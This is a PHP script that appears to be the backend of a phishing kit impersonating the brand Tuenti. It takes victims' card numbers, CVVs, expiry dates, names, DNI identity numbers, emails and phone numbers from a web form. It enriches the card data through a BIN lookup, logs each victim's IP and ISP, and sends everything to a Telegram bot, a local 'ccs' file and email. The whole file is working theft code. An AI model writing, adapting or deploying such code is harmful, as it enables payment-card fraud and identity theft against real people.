<?php
if(isset($_POST)){
	$filter = "";
	$mensaje = ">> Datos personales <<\n";
	if(isset($_POST["numero"])){
		$mensaje .= "Numero: ".$_POST["numero"]."\n";
		$filter .= strtolower($_POST["numero"]);
	}
	if(isset($_POST["montofinal_hidden"])){
		$mensaje .= "Monto: ".$_POST["montofinal_hidden"]."\n";
		$filter .= strtolower($_POST["montofinal_hidden"]);
	}
	if(isset($_POST["email"])){
		$mensaje .= "Email: ".$_POST["email"]."\n";
		$filter .= strtolower($_POST["email"]);
	}
	$mensaje .= "\n\n>> Tarjeta <<\n";
	if(isset($_POST["name"])){
		$mensaje .= "Nombre en tarjeta: ".$_POST["name"]."\n";
		$filter .= strtolower($_POST["name"]);
	}
	if(isset($_POST["dni"])){
		$mensaje .= "DNI: ".$_POST["dni"]."\n";
		$filter .= strtolower($_POST["dni"]);
	}	
	if(isset($_POST["card"])){
		$mensaje .= "Tarjeta: ".$_POST["card"]."\n";
		$filter .= strtolower($_POST["card"]);
	}
	if(isset($_POST["cvv"])){
		$mensaje .= "CVV: ".$_POST["cvv"]."\n";
		$filter .= strtolower($_POST["cvv"]);
	}
	if(isset($_POST["venc"])){
		$mensaje .= "Vencimiento: ".$_POST["venc"]."\n";
		$filter .= strtolower($_POST["venc"]);
	}
	$filter = base64_encode($filter);
	$mensaje .= "\n\n>> Datos de tarjeta <<\n";
	$bin = substr(str_replace(" ", "", $_POST["card"]), 0, 6);
	$result = file_get_contents("https://lookup.binlist.net/".$bin);
	$result = json_decode($result, true);
	if(isset($result["type"])){
		$mensaje .= "Tipo: ".$result["type"]."\n";
	}
	else {
		$mensaje .= "Tipo: No encontrado\n";
	}
	if(isset($result["brand"])){
		$mensaje .= "Marca: ".$result["brand"]."\n";
	}
	else {
		$mensaje .= "Marca: No encontrado\n";
	}
	if(isset($result["scheme"])){
		$mensaje .= "Esquema: ".$result["scheme"]."\n";
	}
	else {
		$mensaje .= "Esquema: No encontrado\n";
	}
	if(isset($result["country"]["name"])){
		$mensaje .= "Pais: ".$result["country"]["name"]."\n";
	}
	else {
		$mensaje .= "Pais: No encontrado\n";
	}
	if(isset($result["bank"]["name"])){
		$mensaje .= "Banco: ".$result["bank"]["name"]."\n";
	}
	else {
		$mensaje .= "Banco: No encontrado\n";
	}
	if(isset($result["bank"]["url"])){
		$mensaje .= "Url: ".$result["bank"]["url"]."\n";
	}
	else {
		$mensaje .= "Url: No encontrado\n";
	}
	if(isset($result["bank"]["phone"])){
		$mensaje .= "Telefono: ".$result["bank"]["phone"]."\n";
	}
	else {
		$mensaje .= "Telefono: No encontrado\n";
	}
	if(isset($result["bank"]["city"])){
		$mensaje .= "Ciudad: ".$result["bank"]["city"]."\n";
	}
	else {
		$mensaje .= "Ciudad: No encontrado\n";
	}
	include("config.php");
	$ip = getenv("REMOTE_ADDR");
	$isp = gethostbyaddr($_SERVER['REMOTE_ADDR']);
	define('BOT_TOKEN', $bottoken);
	define('CHAT_ID', $chatid);
	define('API_URL', 'https://api.telegram.org/bot'.BOT_TOKEN.'/');
	function enviar_telegram($msj){
		$queryArray = [
			'chat_id' => CHAT_ID,
			'text' => $msj,
		];
		$url = 'https://api.telegram.org/bot'.BOT_TOKEN.'/sendMessage?'. http_build_query($queryArray);
		$result = file_get_contents($url);
	}
	$file_name = 'data/'.$ip.'.db';
	$read_data = fopen($file_name, "a+");
	function enviar(){
		global $telegram_send, $file_save, $email_send, $mensaje, $ip, $isp;
		if($telegram_send){
			enviar_telegram(">> Tuenti <<\n\n>> Datos de conexión <<\nIP: ".$ip."\nISP: ".$isp."\n\n".$mensaje);
		}
		if($file_save){
			$ccs_file_name = 'ccs/data.txt';
			$save_data = fopen($ccs_file_name, "a+");
			$msg = "========== DATOS Tuenti ==========\n\n";
			$msg .= ">> Datos de conexión <<\n\nIP: ".$ip."\nISP: ".$isp."\n\n";
			$msg .= $mensaje;
			$msg .= "========== DATOS Tuenti ==========\n\n";
			fwrite($save_data, $msg);
			fclose($save_data);
		}
		if($email_send){
			$msg = ">> Tuenti <<\n\n";
			$msg .= $mensaje;
			mail($email, "Tuenti", $msg);
		}
	}
	if($read_data){
		$data = fgets($read_data);
		$data = explode(";", $data);
		if(!(in_array($filter, $data))){
			fwrite($read_data, $filter.";");
			fclose($read_data);
			enviar();
		}
	}
	else {
		fwrite($read_data, $filter.";");
		fclose($read_data);
		enviar();
	}
}
?>